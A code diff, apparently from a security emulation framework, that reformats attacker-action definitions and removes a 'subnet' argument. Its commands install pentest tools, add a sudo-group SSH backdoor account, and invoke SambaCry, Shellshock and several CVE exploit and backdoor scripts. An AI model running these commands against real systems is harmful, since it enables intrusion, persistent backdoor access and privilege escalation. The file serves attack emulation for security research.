@@ -25,7 +25,7 @@ class EmulationAttackerShellActions:
                                        type=EmulationAttackerActionType.POST_EXPLOIT,
                                        descr="Searches the file system for a flag",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.FLAG, alt_cmds=alt_cmd,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.FLAG, alt_cmds=alt_cmd,
                                        backdoor=False)
 
     @staticmethod
@@ -38,12 +38,14 @@ class EmulationAttackerShellActions:
         """
         id = EmulationAttackerActionId.INSTALL_TOOLS
         cmd = ["sudo apt-get -y install nmap ssh git unzip lftp",
-               "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"]
+               "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip "
+               "-O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && "
+               "sudo mv SecLists-master /SecLists"]
         return EmulationAttackerAction(id=id, name="Install tools", cmds=cmd,
                                        type=EmulationAttackerActionType.POST_EXPLOIT,
                                        descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.PIVOTING, alt_cmds=None,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PIVOTING, alt_cmds=None,
                                        backdoor=False)
 
     @staticmethod
@@ -55,13 +57,15 @@ class EmulationAttackerShellActions:
         :return: the action
         """
         id = EmulationAttackerActionId.SSH_BACKDOOR
-        cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p \"$(openssl passwd -1 '{}')\" {}"]
+        cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G "
+                                         "sudo -p \"$(openssl passwd -1 '{}')\" {}"]
         return EmulationAttackerAction(id=id, name="Install SSH backdoor", cmds=cmd,
                                        type=EmulationAttackerActionType.POST_EXPLOIT,
-                                       descr="If taken root on remote machine, installs a ssh backdoor, useful for upgrading telnet"
-                            "or weaker channels",
+                                       descr="If taken root on remote machine, installs a ssh backdoor,"
+                                             " useful for upgrading telnet"
+                                             "or weaker channels",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.PIVOTING,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PIVOTING,
                                        alt_cmds=None,
                                        backdoor=True)
 
@@ -78,10 +82,11 @@ class EmulationAttackerShellActions:
                "-r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"]
         return EmulationAttackerAction(id=id, name="Sambacry Explolit", cmds=cmd,
                                        type=EmulationAttackerActionType.EXPLOIT,
-                                       descr="Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor "
+                                       descr="Uses the sambacry shell to get remote code execution and"
+                                             " then sets up a SSH backdoor "
                             "to upgrade the channel",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                        alt_cmds=None,
                                        vulnerability=constants.SAMBA.VULNERABILITY_NAME,
                                        backdoor=True)
@@ -103,9 +108,10 @@ class EmulationAttackerShellActions:
                ]
         return EmulationAttackerAction(id=id, name="ShellShock Explolit", cmds=cmd,
                                        type=EmulationAttackerActionType.EXPLOIT,
-                                       descr="Uses the Shellshock exploit and curl to do remote code execution and create a backdoor",
+                                       descr="Uses the Shellshock exploit and curl to do "
+                                             "remote code execution and create a backdoor",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
                                        vulnerability=constants.SHELLSHOCK.VULNERABILITY_NAME,
                                        backdoor=True)
 
@@ -123,7 +129,8 @@ class EmulationAttackerShellActions:
                                        type=EmulationAttackerActionType.EXPLOIT,
                                        descr="Uses the DVWA SQL Injection exploit to extract secret passwords",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
+                                       ips=[],
+                                       action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
                                        vulnerability=constants.DVWA_SQL_INJECTION.VULNERABILITY_NAME,
                                        backdoor=True)
 
@@ -136,13 +143,16 @@ class EmulationAttackerShellActions:
         :return: the action
         """
         id = EmulationAttackerActionId.CVE_2015_3306_EXPLOIT
-        cmd = ["sudo /root/miniconda3/bin/python3 /cve_2015_3306_exploit.py --port 21 --path '/var/www/html/' --host {}"]
+        cmd = ["sudo /root/miniconda3/bin/python3 /cve_2015_3306_exploit.py "
+               "--port 21 --path '/var/www/html/' --host {}"]
         return EmulationAttackerAction(id=id, name="CVE-2015-3306 exploit", cmds=cmd,
                                        type=EmulationAttackerActionType.EXPLOIT,
-                                       descr="Uses the CVE-2015-3306 vulnerability to get remote code execution and then sets up a SSH backdoor "
+                                       descr="Uses the CVE-2015-3306 vulnerability to get remote code "
+                                             "execution and then sets up a SSH backdoor "
                             "to upgrade the channel",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
+                                       alt_cmds=None,
                                        vulnerability=constants.CVE_2015_3306.VULNERABILITY_NAME,
                                        backdoor=True)
 
@@ -163,7 +173,8 @@ class EmulationAttackerShellActions:
                                              "then sets up a SSH backdoor "
                             "to upgrade the channel",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
+                                       alt_cmds=None,
                                        vulnerability=constants.CVE_2015_1427.VULNERABILITY_NAME,
                                        backdoor=True)
 
@@ -179,10 +190,12 @@ class EmulationAttackerShellActions:
         cmd = ["/cve_2016_10033_exploit.sh {}:80"]
         return EmulationAttackerAction(id=id, name="CVE-2016-10033 exploit", cmds=cmd,
                                        type=EmulationAttackerActionType.EXPLOIT,
-                                       descr="Uses the CVE-2016-10033 vulnerability to get remote code execution and then sets up a SSH backdoor "
-                            "to upgrade the channel",
+                                       descr="Uses the CVE-2016-10033 vulnerability to get remote "
+                                             "code execution and then sets up a SSH backdoor "
+                                             "to upgrade the channel",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
+                                       alt_cmds=None,
                                        vulnerability=constants.CVE_2016_10033.VULNERABILITY_NAME,
                                        backdoor=True)
 
@@ -198,9 +211,10 @@ class EmulationAttackerShellActions:
         cmd = ["/cve_2010_0426_exploit.sh {}", "/create_backdoor_cve_2010_0426.sh"]
         return EmulationAttackerAction(id=id, name="CVE-2010-0426 exploit", cmds=cmd,
                                        type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
-                                       descr="Uses the CVE-2010-0426 vulnerability to perform privilege escalation to get root access",
+                                       descr="Uses the CVE-2010-0426 vulnerability to "
+                                             "perform privilege escalation to get root access",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                        alt_cmds=None,
                                        vulnerability=constants.CVE_2010_0426.VULNERABILITY_NAME,
                                        backdoor=True)
@@ -218,8 +232,9 @@ class EmulationAttackerShellActions:
                "/create_backdoor_cve_2015_5602.sh"]
         return EmulationAttackerAction(id=id, name="CVE-2015-5602 exploit", cmds=cmd,
                                        type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
-                                       descr="Uses the CVE-2015-5602 vulnerability to perform privilege escalation to get root access",
+                                       descr="Uses the CVE-2015-5602 vulnerability to perform "
+                                             "privilege escalation to get root access",
                                        index=index,
-                                       ips=[], subnet=False, action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                        alt_cmds=None, vulnerability=constants.CVE_2015_5602.VULNERABILITY_NAME,
                                        backdoor=True)
